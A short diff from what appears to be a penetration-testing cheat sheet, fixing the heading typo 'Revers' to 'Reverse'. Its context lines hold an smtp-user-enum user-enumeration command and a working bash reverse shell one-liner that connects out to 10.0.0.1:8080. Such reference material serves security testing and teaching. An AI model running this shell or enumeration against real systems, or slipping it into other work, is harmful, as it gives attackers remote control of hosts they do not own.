@@ -101,7 +101,7 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ## Gaining Access
 
-#### Revers Shell One-Liners
+#### Reverse Shell One-Liners
 ##### Bash
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
